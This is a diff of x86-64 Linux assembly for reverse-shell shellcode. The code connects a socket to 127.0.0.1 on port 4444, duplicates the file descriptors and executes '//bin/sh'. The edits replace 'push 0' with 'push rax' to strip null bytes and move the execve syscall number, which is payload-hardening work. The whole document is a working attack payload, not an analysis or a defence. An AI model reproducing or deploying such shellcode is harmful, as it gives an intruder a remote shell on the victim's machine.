@@ -16,7 +16,7 @@ _start:
 	; connect syscall: int connect(int sockfd, const struct sockaddr *addr{sin_family, sin_port, sin_addr}, socklen_t addrlen);
 	xchg edi, eax		; sockfd = 32 bit file descriptor returned from socket syscall
 	mov al, 42		; syscall = connect
-	push rdx		; pad 8 bytes to align with sockaddr
+	push rdx		; pad 8 null bytes to align with sockaddr
 	mov rsi, 0x0100007f5c110002	; sin_addr = 127.0.0.1, sin_port = 4444, sin_family = AF_INET, reversed for little endian
 	push rsi		; push sockaddr to stack
 	mov rsi, rsp		; sockaddr = structure in the stack
@@ -40,12 +40,12 @@ dup2Loop:
 	;syscall
 	
 	; execve syscall: int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
-	mov al, 59		; syscall = execve
-	push 0			; push NULL string terminalor
+	push rax		; push NULL string terminator, rax is null from previous syscall
 	mov rdi,  0x68732f6e69622f2f	; pathname = '//bin/sh', reversed for little endian
 	push rdi		; push string to stack
 	mov rdi, rsp		; set first arg to pathname pointer
-	push 0			
+	push rax		; push another null terminator	
 	mov rsi, rsp		; set second arg to pathname pointer
 	mov dl, 0	    	; envp = NULL 
+	mov al, 59		; syscall = execve
 	syscall
